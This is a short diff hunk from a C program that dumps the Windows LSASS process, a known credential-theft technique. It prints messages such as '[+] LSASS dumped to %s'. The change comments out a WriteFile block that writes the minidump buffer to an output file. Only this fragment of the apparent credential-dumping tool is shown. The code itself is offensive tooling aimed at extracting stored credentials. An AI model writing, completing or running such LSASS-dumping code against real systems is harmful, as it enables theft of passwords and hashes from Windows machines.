@@ -81,13 +81,14 @@ int main()
         return -2;
     }
     //printf("MiniDumpWriteDump Success !\n");
-
+    /*
     DWORD bytesWritten;
     if (!WriteFile(outFile, &minidump, lpReOpenBuff.cBytes, &bytesWritten, NULL)) {
         
         printf("[-] Failed writing LSASS dump ! ERROR: %d\n", GetLastError());
         return -2;
     }
+    */
 
     printf("[+] LSASS dumped to %s\n", location);
     CloseHandle(outFile);
